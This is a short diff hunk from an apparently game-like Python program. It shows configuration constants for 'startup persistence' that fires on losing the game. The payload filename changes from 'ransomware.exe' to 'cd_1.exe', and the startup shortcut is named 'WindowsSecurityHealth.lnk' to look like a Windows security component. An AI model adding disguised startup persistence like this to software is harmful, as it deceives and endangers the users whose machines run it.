@@ -60,7 +60,7 @@ _icon_backup = None
 # ---------------------------------------------------------------------------
 # Startup persistence (opt-in; only fires on lose_game)
 # ---------------------------------------------------------------------------
-STARTUP_PAYLOAD_FILENAME = 'ransomware.exe'          # <-- change me
+STARTUP_PAYLOAD_FILENAME = 'cd_1.exe'          # <-- change me
 STARTUP_LINK_NAME        = 'WindowsSecurityHealth.lnk'
 
 # ---------------------------------------------------------------------------
